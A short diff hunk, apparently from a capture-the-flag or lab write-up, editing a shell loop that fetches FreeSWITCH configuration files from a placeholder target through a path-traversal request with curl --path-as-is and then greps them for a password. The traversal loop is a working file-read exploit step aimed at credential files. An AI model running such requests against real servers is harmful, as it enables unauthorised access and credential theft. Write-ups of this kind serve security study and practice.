@@ -90,7 +90,7 @@ grep -Ril '' /mnt/etc/freeswitch/autoload_configs/ | xargs -n1 basename > tmp
 
 # 2. fetch each LIVE file through the LFI and append into one file:
 for i in $(cat tmp); do
-  curl -s -q --path-as-is "http://<IP>:3000/../../../../etc/freeswitch/autoload_configs/$i" >> carve
+  curl -s --path-as-is "http://<IP>:3000/../../../../etc/freeswitch/autoload_configs/$i" >> carve
 done
 
 # 3. one grep finds the real password across all of them:
